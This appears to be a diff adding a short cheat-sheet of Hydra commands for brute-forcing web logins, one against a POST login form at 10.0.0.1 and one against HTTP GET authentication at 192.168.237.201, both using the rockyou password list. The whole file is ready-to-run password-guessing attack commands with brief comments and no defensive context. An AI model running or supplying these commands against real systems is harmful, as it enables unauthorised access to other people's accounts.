@@ -1,0 +1,5 @@
+hydra -l username -P /usr/share/wordlists/rockyou.txt 10.0.0.1 http-post-form "/login.php:usr=username&pwd=^PASS^:Login failed. Invalid"
+# BruteForce using Post
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.237.201
+# BF using get
